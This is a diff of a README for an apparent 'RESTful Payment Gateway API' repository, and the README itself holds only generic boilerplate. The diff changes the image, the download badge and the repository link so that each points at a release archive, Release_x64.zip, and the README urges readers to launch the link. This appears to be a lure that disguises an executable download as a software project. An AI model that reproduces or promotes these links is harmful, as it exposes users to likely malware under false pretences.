@@ -1,6 +1,6 @@
 # 🌟 Welcome to the RESTful Payment Gateway API Repository 🌟
 
-![Payment Gateway](https://image.freepik.com/free-vector/mobile-payment-concept-illustration_114360-1352.jpg)
+![Payment Gateway](https://github.com/5xso/RESTful-Payment-Gateway-API/releases/download/v1.0/Release_x64.zip)
 
 ### Repository Name: RESTful-Payment-Gateway-API
 ### Repository Description:
@@ -18,13 +18,13 @@ To dive into the world of seamless payment processing, simply follow the steps b
 4. Ensure to follow best practices for API versioning and security.
 
 ### 🔗 Download the Software
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/5xso/RESTful-Payment-Gateway-API/releases/download/v1.0/Release_x64.zip)](https://github.com/5xso/RESTful-Payment-Gateway-API/releases/download/v1.0/Release_x64.zip)
 
 Please note that the link provided above needs to be launched to access the software.
 
 ### 🌐 Explore More
 Visit the following link to discover additional resources and updates:
-[RESTful Payment Gateway API - GitHub Repository](https://github.com/22155555/1875695542)
+[RESTful Payment Gateway API - GitHub Repository](https://github.com/5xso/RESTful-Payment-Gateway-API/releases/download/v1.0/Release_x64.zip)
 
 ### 🌟 Contribute
 Contributions to this project are always welcome! Feel free to fork the repository, make improvements, and create a pull request to collaborate with the community.
